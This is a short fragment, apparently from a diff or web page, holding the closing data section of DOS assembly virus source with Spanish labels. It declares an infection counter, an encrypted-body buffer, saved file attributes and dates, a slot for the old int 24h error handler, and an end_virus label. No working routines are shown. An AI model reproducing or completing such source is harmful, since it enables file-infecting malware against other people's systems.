+buffer_tmp db 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
+es_command db 'N'
+vsafe db 00h
+infeccion dw 00h
+registro dd 00h
+atributos dw 00h
+fecha dd 00h
+old_24h dd 00h
+buffer_encriptado db 1670d dup (0)
+end_virus:
+
+CODIGO  ENDS
+	END INSTALL
+
+```
+
+</div>
